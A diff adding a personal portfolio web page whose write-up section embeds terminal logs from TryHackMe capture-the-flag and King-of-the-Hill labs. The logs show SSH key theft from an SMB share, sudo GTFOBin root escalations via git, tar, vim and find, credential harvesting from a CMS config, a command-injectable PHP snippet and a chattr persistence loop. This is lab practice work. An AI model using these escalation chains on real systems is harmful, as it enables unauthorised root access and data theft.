+            bash-4.2# cat /home/po/flag.txt
+            [REDACTED]
+            bash-4.2# /home/shifu/flag.txt
+            bash: /home/shifu/flag.txt: Permission denied
+            bash-4.2# cat /home/shifu/flag.txt
+            [REDACTED]
+            bash-4.2# cat /home/tigress/flag.txt
+            [REDACTED]
+            bash-4.2# /var/www/html/flag/index.html (hex and b64)
+            bash: syntax error near unexpected token \`hex'
+            bash-4.2# cat /var/www/html/flag/index.html
+            [REDACTED]
+            bash-4.2# cat /var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
+            [REDACTED]
+            bash-4.2# cat /srv/samba/anonymous/binary
+            [garbled binary data]
+            bash-4.2# strings /srv/samba/anonymous/binary
+            /lib64/ld-linux-x86-64.so.2
+            libc.so.6
+            printf
+            __libc_start_main
+            __gmon_start__
+            GLIBC_2.2.5
+            UH-0
+            UH-0
+            =(
+            []A\A]A^A_
+            Hello
+            ;*3$"
+            GCC: (GNU) 4.8.5 20150623 (Red Hat 4.8.5-39)
+            crtstuff.c
+            __JCR_LIST__
+            deregister_tm_clones
+            __do_global_dtors_aux
+            completed.6355
+            __do_global_dtors_aux_fini_array_entry
+            frame_dummy
+            __frame_dummy_init_array_entry
+            binary.c
+            __FRAME_END__
+            __JCR_END__
+            __init_array_end
+            _DYNAMIC
+            __init_array_start
+            __GNU_EH_FRAME_HDR
+            _GLOBAL_OFFSET_TABLE_
+            __libc_csu_fini
+            _edata
+            printf@@GLIBC_2.2.5
+            __libc_start_main@@GLIBC_2.2.5
+            __data_start
+            __gmon_start__
+            __dso_handle
+            _IO_stdin_used
+            __libc_csu_init
+            __bss_start
+            main
+            __TMC_END__
+            .symtab
+            .strtab
+            .shstrtab
+            .interp
+            .note.ABI-tag
+            .note.gnu.build-id
+            .gnu.hash
+            .dynsym
+            .dynstr
+            .gnu.version
+            .gnu.version_r
+            .rela.dyn
+            .rela.plt
+            .init
+            .plt.got
+            .text
+            .fini
+            .rodata
+            .eh_frame_hdr
+            .eh_frame
+            .init_array
+            .fini_array
+            .jcr
+            .dynamic
+            .got.plt
+            .data
+            .bss
+            .comment
+            [REDACTED]
+            6c6CXfJrjej5ATBD
+            bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64
+            [REDACTED]
+            bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64 -d
+            [garbled binary data]
+            bash-4.2# cat /var/www/html/flag/index.html | xxd -p
+            [REDACTED]
+            bash-4.2# # Hex
+            bash-4.2# xxd -p /var/www/html/flag/index.html
+            [REDACTED]
+            bash-4.2#
+            bash-4.2# # Base64
+            bash-4.2# base64 /var/www/html/flag/index.html
+            [REDACTED]
+            bash-4.2# cat /var/www/html/flag/index.html
+            [REDACTED]
+            bash-4.2#
+            last flag: [REDACTED]
+            To get to shifu's shell
+            creds
+            shifu:[Find it yourself]
+            how to be root
+            find . -exec /bin/sh -p \; -quit
+            bash -i -p`,
+        },
+        {
+          title: "Production",
+          desc: "SMB share leaked an SSH keypair; chained su and a sudo PAGER GTFOBin through git to escalate straight to root.",
+          tags: ["Linux", "SMB", "GTFOBins"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+            └─# smbclient //10.10.98.241/key
+            Password for [WORKGROUP\root]:
+            Try "help" to get a list of possible commands.
+            smb: \> ls
+              .                                  DR        0  Thu Mar 26 23:24:38 2020
+              ..                                  D        0  Thu Mar 26 20:18:40 2020
+              id_rsa.pub                          A      393  Mon Sep 28 15:02:01 2026
+              flag.txt                            A       33  Thu Mar 26 23:24:38 2020
+              id_rsa                              R     1679  Mon Sep 28 15:02:01 2026
+              authorized_keys                     A      393  Mon Sep 28 15:02:01 2026
+
+                            19525500 blocks of size 1024. 13268812 blocks available
+            smb: \> get flag.txt
+            getting file \flag.txt of size 33 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+            smb: \> get id_rsa
+            getting file \id_rsa of size 1679 as id_rsa (1.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+            smb: \> get id_rsa.pub
+            getting file \id_rsa.pub of size 393 as id_rsa.pub (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+            smb: \> exit
+            ^C
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# cat flag.txt
+            [REDACTED]
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# ssh ashu@10.10.98.241 -i id_rsa
+            The authenticity of host '10.10.98.241 (10.10.98.241)' can't be established.
+            ED25519 key fingerprint is: SHA256:ndwZ/MwYvbVyLcm8bvjebocizMD1b8pdb2leReW/6ko
+            This key is not known by any other names.
+            Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+            Warning: Permanently added '10.10.98.241' (ED25519) to the list of known hosts.
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            Permissions 0644 for 'id_rsa' are too open.
+            It is required that your private key files are NOT accessible by others.
+            This private key will be ignored.
+            Load key "id_rsa": bad permissions
+            ashu@10.10.98.241's password:
+            Permission denied, please try again.
+            ashu@10.10.98.241's password:
+            Permission denied, please try again.
+            ashu@10.10.98.241's password:
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# ssh ashu@10.10.98.241 -i id_rsa
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+            Permissions 0644 for 'id_rsa' are too open.
+            It is required that your private key files are NOT accessible by others.
+            This private key will be ignored.
+            Load key "id_rsa": bad permissions
+            ashu@10.10.98.241's password:
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# chmod 600 id_rsa
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# ssh ashu@10.10.98.241 -i id_rsa
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+
+             * Documentation:  https://help.ubuntu.com
+             * Management:     https://landscape.canonical.com
+             * Support:        https://ubuntu.com/advantage
+
+            84 packages can be updated.
+            0 updates are security updates.
+
+            Last login: Thu Mar 26 12:47:21 2020 from 192.168.197.129
+            ashu@thm-prod:~$ sudo /bin/su skidy
+            skidy@thm-prod:/home/ashu$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help config
+            # id
+            uid=0(root) gid=0(root) groups=0(root)
+            # cat /home/ashu/flag.txt
+            [REDACTED]
+            # cat /home/ashu/mail-server-backup/support-room-help.txt
+            TO: support@tryhackme.com
+            FROM: epicskidnoob123@yahoo.com
+            SUBJECT: pls help
+            BODY:
+            hi, pls, room no work, ned halp.
+
+            Regards,
+            e1337 Haxx0r #87
+
+            =======================================================================================
+            REPLY:
+
+            Hello, I honestly cannot be bothered to even decipher that, so just have the flag: [REDACTED]
+
+            Thanks,
+            Ashu - TryHackMe
+            # cat /home/skidy/flag.txt
+            [REDACTED]
+            # cat /var/ftp/flag.txt
+            [REDACTED]
+            # uname -a
+            Linux thm-prod 4.15.0-91-generic #92~16.04.1-Ubuntu SMP Fri Feb 28 14:57:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+            # id
+            uid=0(root) gid=0(root) groups=0(root)`,
+        },
+        {
+          title: "Shrek",
+          desc: "SSH key access then a classic tar --checkpoint-action GTFOBin for root; cracked CMS Made Simple's DB creds from config.php for the final flag.",
+          tags: ["Linux", "GTFOBins", "MySQL"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+            └─# nano id_rsa
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# chmod 600 id_rsa
+
+            ┌──(root㉿kali)-[/home/kali]
+            └─# ssh shrek@10.10.220.110 -i id_rsa
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            Last login: Thu Mar 12 09:39:10 2020 from cyberdyne
+            [shrek@shrek ~]$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+            [sudo] password for shrek:
+            Sorry, try again.
+            [sudo] password for shrek:
+            sudo: 1 incorrect password attempt
+            [shrek@shrek ~]$ su donkey
+            Password:
+            [donkey@shrek shrek]$ whoami
+            donkey
+            [donkey@shrek shrek]$ id
+            uid=1002(donkey) gid=1002(donkey) groups=1002(donkey)
+            [donkey@shrek shrek]$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+            tar: Removing leading '/' from member names
+            sh-4.2# whoami
+            root
+            sh-4.2# cat /root/root.txt
+            [REDACTED]
+            sh-4.2# cat /home/shrek/flag.txt
+            [REDACTED]
+            sh-4.2# cat /home/donkey/flag.txt
+            [REDACTED]
+            sh-4.2# cat /home/puss/flag.txt
+            [REDACTED]
+            sh-4.2# cat /srv/web/flag.txt
+            [REDACTED]
+            sh-4.2# cat /var/lib/docker/overlay2/8039e912cd29e964102163c37a1f05795ea99e7da6c1a800dd9749417d88c680/diff/root/flag.txt
+            [REDACTED]
+            sh-4.2# mysql -u username -p -e "SELECT * FROM cms.flag;"
+            Enter password:
+            ERROR 1142 (42000) at line 1: SELECT command denied to user ''@'localhost' for table 'flag'
+            sh-4.2# mysql -u donkey -p -e "SELECT * FROM cms.flag;"
+            Enter password:
+            ERROR 1045 (28000): Access denied for user 'donkey'@'localhost' (using password: YES)
+            sh-4.2# mysql -u root -p
+            Enter password:
+            ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
+            sh-4.2# find /var/www /srv -type f \( -name 'config.php' -o -name '*config*' \) 2>/dev/null
+            /var/www/html/api/config.php
+            /var/www/html/cms/lib/classes/class.cms_config.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_config_source.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_compile_config_load.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_config.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_config_file_compiler.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_configfilelexer.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_configfileparser.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_clearconfig.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_compileallconfig.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_configload.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_getconfigvariable.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_getconfigvars.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_registerdefaultconfighandler.php
+            /var/www/html/cms/lib/smarty/sysplugins/smarty_template_config.php
+            /var/www/html/cms/modules/MicroTiny/templates/tinymce_config.js
+            /var/www/html/cms/config.php
+            sh-4.2# cat /var/www/html/cms/config.php
+            <?php
+            # CMS Made Simple Configuration File
+            # Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
+            #
+            $config['dbms'] = 'mysqli';
+            $config['db_hostname'] = 'localhost';
+            $config['db_username'] = 'root';
+            $config['db_password'] = 'password';
+            $config['db_name'] = 'cms';
+            $config['db_prefix'] = 'cms_';
+            $config['timezone'] = 'UTC';
+            ?>sh-4.2# mysql -u root -p
+            Enter password:
+            Welcome to the MySQL monitor.  Commands end with ; or \g.
+            Your MySQL connection id is 6
+            Server version: 5.6.47 MySQL Community Server (GPL)
+
+            Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+            Oracle is a registered trademark of Oracle Corporation and/or its
+            affiliates. Other names may be trademarks of their respective
+            owners.
+
+            Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+            mysql> USE cms;
+            Reading table information for completion of table and column names
+            You can turn off this feature to get a quicker startup with -A
+
+            Database changed
+            mysql> SELECT * FROM flag;
+            +----------------------------------+
+            | Flag                             |
+            +----------------------------------+
+            | [REDACTED]                       |
+            +----------------------------------+
+            1 row in set (0.01 sec)
+
+            mysql>`,
+        },
+        {
+          title: "Tyler",
+          desc: "Password SSH in, escalated via a Vim Python GTFOBin to root; found a command-injection flag hidden in a PHP source comment.",
+          tags: ["Linux", "GTFOBins"],
+          log: String.raw`┌──(root㉿kali)-[/home/kali]
+            └─# ssh narrator@10.10.145.231
+            The authenticity of host '10.10.145.231 (10.10.145.231)' can't be established.
+            ED25519 key fingerprint is: SHA256:91koJED2zxYATWjl4ZS3xjwpxesiSU1RAbRpASSXIG8
+            This key is not known by any other names.
+            Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+            Warning: Permanently added '10.10.145.231' (ED25519) to the list of known hosts.
+            ** WARNING: connection is not using a post-quantum key exchange algorithm.
+            ** This session may be vulnerable to "store now, decrypt later" attacks.
+            ** The server may need to be upgraded. See https://openssh.com/pq.html
+            narrator@10.10.145.231's password:
+            Last login: Thu Mar 26 10:52:23 2020 from cyberdyne
+            [narrator@tyler ~]$ whoami
+            narrator
+            [narrator@tyler ~]$ id
+            uid=1002(narrator) gid=1002(narrator) groups=1002(narrator)
+            [narrator@tyler ~]$ /usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+
+            Erase is control-H (^H).
+            sh-4.2# xterm
+            sh: xterm: command not found
+            sh-4.2# ls -la
+            total 20
+            drwx------  4 narrator narrator 138 Mar 26  2020 .
+            drwxr-xr-x. 4 root     root      37 Mar 25  2020 ..
+            drwxr-xr-x  5 narrator narrator  71 Mar 27  2020 app
+            lrwxrwxrwx  1 root     root       9 Mar 26  2020 .bash_history -> /dev/null
+            -rw-r--r--  1 narrator narrator  18 Aug  8  2019 .bash_logout
+            -rw-r--r--  1 narrator narrator 193 Aug  8  2019 .bash_profile
+            -rw-r--r--  1 narrator narrator 231 Aug  8  2019 .bashrc
+            drwx------  2 narrator narrator  61 Mar 25  2020 .ssh
+            -rw-r--r--  1 narrator narrator  33 Mar 26  2020 user.txt
+            -rw-------  1 narrator narrator 676 Mar 25  2020 .viminfo
+            sh-4.2# whoami
+            root
+            sh-4.2# cat /root/root.txt
+            [REDACTED]
+            sh-4.2# cat /home/narrator/user.txt
+            [REDACTED]
+            sh-4.2# cat /home/tdurden/user.txt
+            [REDACTED]
+            sh-4.2# cat /srv/public/flag.txt
+            [REDACTED]
+            sh-4.2# cat /centos_chroot/root/flag.txt
+            [REDACTED]
+            sh-4.2# cat /var/www/html/betatest/checkuser.php
+            <?php
+            if ( isset($_POST['submit'] ) ) {
+            $cmd1 = "cat /etc/passwd | grep " . $_POST['user'];
+            echo system($cmd1);
+            }
+            // flag{[REDACTED]}
+            ?>
+            sh-4.2#`,
+        },
+        {
+          title: "How to be king",
+          desc: "A persistence loop for king.txt-style KoTH challenges: strips the immutable/append-only attribute, overwrites the file with your name, then re-locks it with chattr so other players can't silently take it back.",
+          tags: ["KoTH", "Persistence"],
+          log: String.raw`while true; do
+          chattr -ia /root/king.txt 2>/dev/null
+          echo 0x7f3a > /root/king.txt 2>/dev/null
+          chattr +ia /root/king.txt 2>/dev/null
+          sleep 0.1
+      done`,
+        },
+      ];
+
+      /* Example:
+                          { title: "KoTH: Room name", desc: "Short summary.", tags: ["THM", "KoTH"], href: "https://..." }
+                          */
+
+      const ACHIEVEMENTS = [
+        {
+          title: "TryHackMe",
+          desc: "National all-time general ranking: 2nd place.\nNational all-time King of the Hill ranking: 1st place.",
+          tags: ["THM", "Antarctica", "KoTH"],
+          links: [
+            { label: "Profile", href: "https://tryhackme.com/p/0x7f3a" },
+            {
+              label: "Hacker Holidays",
+            },
+            {
+              label: "Advent of Cyber 2024",
+            },
+            {
+              label: "Advent of Cyber 2023",
+            },
+            {
+              label: "Advent of Cyber 2022",
+            },
+            {
+              label: "Pre Security",
+            },
+          ],
+        },
+        {
+          title: "HackTheBox",
+          desc: "Level 35 - Skilled",
+          tags: ["HTB"],
+          href: "https://profile.hackthebox.com/profile/019e9fdc-df40-7346-8de9-0e26e3542a65",
+        },
+        {
+          title: "ComSci / Programming",
+          desc: "Roles: Software Developer, Web Development, Microcontroller Hobbyist",
+          tags: ["CS"],
+          links: [
+            {
+              label: "Advanced Python (Simplilearn)",
+            },
+          ],
+          // add Simplilearn cert here once you have it, e.g. links: [{ label: "Advanced Python", href: "..." }]
+        },
+      ];
+
+      const TIMELINE = [
+        {
+          year: "2018",
+          title: "Coding Journey Begins",
+          details: ["Scratch \u00B7 Programming"],
+        },
+        {
+          year: "2022",
+          title: "Computer Science",
+          details: ["CS50 \u00B7 Computer Science"],
+        },
+        {
+          year: "2024",
+          title: "Developer / Programmer",
+          details: ["Web \u00B7 Python \u00B7 Arduino"],
+        },
+        {
+          year: "2025",
+          title: "Cybersecurity",
+          details: ["CS50 Cybersecurity \u00B7 THM \u00B7 HTB"],
+        },
+        {
+          year: "2026",
+          title: "Red Teaming / KoTH",
+          details: [
+            "THM 0x1 [NEOPHYTE] \u2192 0x11 [VANGUARD]",
+            "KoTH #1 Antarctica",
+            "THM Antarctica #2",
+          ],
+        },
+      ];
+
+      /* ════════ NAV LOGIC ════════ */
+
+      const VIEWS = [
+        "home",
+        "projects",
+        "writeups",
+        "achievements",
+        "timeline",
+      ];
+      const TAGLINES = {
+        home: "Access Log \u00B7 Public Profile",
+        projects: "Access Log \u00B7 Projects",
+        writeups: "Access Log \u00B7 Writeups",
+        achievements: "Access Log \u00B7 Achievements",
+        timeline: "Access Log \u00B7 Timeline",
+      };
+
+      function renderList(id, items, emptyMsg) {
+        const root = document.getElementById(id);
+        root.textContent = "";
+        if (!items.length) {
+          const e = document.createElement("div");
+          e.className = "empty";
+          e.textContent = emptyMsg;
+          root.appendChild(e);
+          return;
+        }
+        items.forEach((it) => {
+          const el = document.createElement(it.href ? "a" : "div");
+          el.className = "entry";
+          if (it.href) {
+            el.href = it.href;
+            el.target = "_blank";
+            el.rel = "noopener";
+          }
+          const h = document.createElement("h3");
+          h.textContent = it.title;
+          const p = document.createElement("p");
+          p.textContent = it.desc || "";
+          el.append(h, p);
+          if (it.tags && it.tags.length) {
+            const t = document.createElement("div");
+            t.className = "tags";
+            it.tags.forEach((x) => {
+              const s = document.createElement("span");
+              s.className = "tag";
+              s.textContent = x;
+              t.appendChild(s);
+            });
+            el.appendChild(t);
+          }
+          if (it.links && it.links.length) {
+            const l = document.createElement("div");
+            l.className = "links";
+            it.links.forEach((x) => {
+              const a = document.createElement(x.href ? "a" : "span");
+              if (x.href) {
+                a.href = x.href;
+                a.target = "_blank";
+                a.rel = "noopener";
+              }
+              a.textContent = x.label;
+              l.appendChild(a);
+            });
+            el.appendChild(l);
+          }
+          root.appendChild(el);
+        });
+      }
+
+      renderList("list-projects", PROJECTS, "No projects yet.");
+      renderWriteups(
+        "list-writeups",
+        WRITEUPS,
+        "$ ls writeups/  ->  KoTH writeups.",
+      );
+      renderList("list-achievements", ACHIEVEMENTS, "No achievements yet.");
+      function renderWriteups(id, items, emptyMsg) {
+        const root = document.getElementById(id);
+        root.textContent = "";
+        if (!items.length) {
+          const e = document.createElement("div");
+          e.className = "empty";
+          e.textContent = emptyMsg;
+          root.appendChild(e);
+          return;
+        }
+        const grid = document.createElement("div");
+        grid.className = "wu-grid";
+
+        items.forEach((it) => {
+          const card = document.createElement("div");
+          card.className = "wu-card";
+
+          const head = document.createElement("button");
+          head.type = "button";
+          head.className = "wu-head";
+          const h3 = document.createElement("h3");
+          h3.textContent = it.title;
+          head.appendChild(h3);
+          if (it.tags && it.tags.length) {
+            const t = document.createElement("div");
+            t.className = "wu-tags";
+            it.tags.forEach((x) => {
+              const s = document.createElement("span");
+              s.className = "tag";
+              s.textContent = x;
+              t.appendChild(s);
+            });
+            head.appendChild(t);
+          }
+
+          const more = document.createElement("div");
+          more.className = "wu-more";
+          const inner = document.createElement("div");
+          inner.className = "wu-more-inner";
+
+          const body = document.createElement("div");
+          body.className = "wu-body";
+          body.textContent = it.desc || "";
+          if (it.href) {
+            const a = document.createElement("a");
+            a.href = it.href;
+            a.target = "_blank";
+            a.rel = "noopener";
+            a.textContent = "Read writeup";
+            body.appendChild(a);
+          }
+          inner.appendChild(body);
+
+          if (it.log) {
+            const pre = document.createElement("pre");
+            pre.className = "wu-log";
+            pre.textContent = it.log;
+            inner.appendChild(pre);
+          }
+
+          more.appendChild(inner);
+
+          head.addEventListener("click", () => card.classList.toggle("open"));
+          card.append(head, more);
+          grid.appendChild(card);
+        });
+
+        root.appendChild(grid);
+      }
+      (function renderTimeline() {
+        const root = document.getElementById("tl-items");
+        const items = [];
+        let timer = null;
+
+        TIMELINE.forEach((t, i) => {
+          const row = document.createElement("div");
+          row.className = "tl-item";
+
+          const head = document.createElement("button");
+          head.type = "button";
+          head.className = "tl-head";
+          head.setAttribute("aria-expanded", "false");
+          const y = document.createElement("span");
+          y.className = "tl-year";
+          y.textContent = t.year;
+          const rail = document.createElement("span");
+          rail.className = "tl-rail";
+          const dot = document.createElement("span");
+          dot.className = "tl-dot";
+          rail.appendChild(dot);
+          const ti = document.createElement("span");
+          ti.className = "tl-title";
+          ti.textContent = t.title;
+          head.append(y, rail, ti);
+
+          const more = document.createElement("div");
+          more.className = "tl-more";
+          const inner = document.createElement("div");
+          inner.className = "tl-more-inner";
+          (t.details || []).forEach((d) => {
+            const l = document.createElement("div");
+            l.className = "tl-detail";
+            l.textContent = d;
+            inner.appendChild(l);
+          });
+          more.appendChild(inner);
+
+          row.append(head, more);
+          root.appendChild(row);
+          items.push({ row, head });
+          head.addEventListener("click", () => {
+            stop();
+            select(i, true);
+          });
+        });
+
+        // reached = up to index `upto`; open = only `openIdx` (or none)
+        function paint(upto, openIdx) {
+          items.forEach((it, i) => {
+            it.row.classList.toggle("reached", i <= upto);
+            it.row.classList.toggle("linked", i < upto);
+            const o = i === openIdx;
+            it.row.classList.toggle("open", o);
+            it.head.setAttribute("aria-expanded", String(o));
+          });
+        }
+
+        let current = -1,
+          openNow = -1;
+        function select(i, toggle) {
+          const willClose = toggle && openNow === i;
+          current = i;
+          openNow = willClose ? -1 : i;
+          paint(current, openNow);
+        }
+
+        function stop() {
+          if (timer) {
+            clearInterval(timer);
+            timer = null;
+          }
+        }
+
+        function replay() {
+          stop();
+          current = -1;
+          openNow = -1;
+          paint(-1, -1);
+          let i = 0;
+          timer = setInterval(() => {
+            select(i, false);
+            i++;
+            if (i >= items.length) stop();
+          }, 850);
+        }
+
+        document.getElementById("tlReplay").addEventListener("click", replay);
+        window.__tlReplay = replay; // used when the view is opened
+        select(items.length - 1, false); // start on the latest entry
+      })();
+
+      const menuBtn = document.getElementById("menuBtn");
+      const menu = document.getElementById("menu");
+
+      function setMenu(open) {
+        menu.classList.toggle("open", open);
+        menuBtn.setAttribute("aria-expanded", String(open));
+        menuBtn.setAttribute("aria-label", open ? "Close menu" : "Open menu");
+      }
+
+      function show(name) {
+        if (!VIEWS.includes(name)) name = "home";
+        VIEWS.forEach((v) => {
+          document.getElementById("view-" + v).hidden = v !== name;
+        });
+        document
+          .querySelector(".card")
+          .classList.toggle("wide", name === "writeups"); // add this line
+        document.getElementById("tagline").textContent = TAGLINES[name];
+        menu.querySelectorAll("a").forEach((a) => {
+          if (a.getAttribute("href") === "#" + name)
+            a.setAttribute("aria-current", "page");
+          else a.removeAttribute("aria-current");
+        });
+        if (name === "timeline" && window.__tlReplay) window.__tlReplay();
+        setMenu(false);
+      }
+
+      menuBtn.addEventListener("click", (e) => {
+        e.stopPropagation();
+        setMenu(!menu.classList.contains("open"));
+      });
+      document.addEventListener("click", (e) => {
+        if (!menu.contains(e.target)) setMenu(false);
+      });
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Escape") {
+          setMenu(false);
+          menuBtn.focus();
+        }
+      });
+      document.querySelectorAll("[data-go]").forEach((b) =>
+        b.addEventListener("click", () => {
+          location.hash = b.dataset.go;
+        }),
+      );
+      window.addEventListener("hashchange", () => show(location.hash.slice(1)));
+      show(location.hash.slice(1));
+    </script>
+  </body>
+</html>
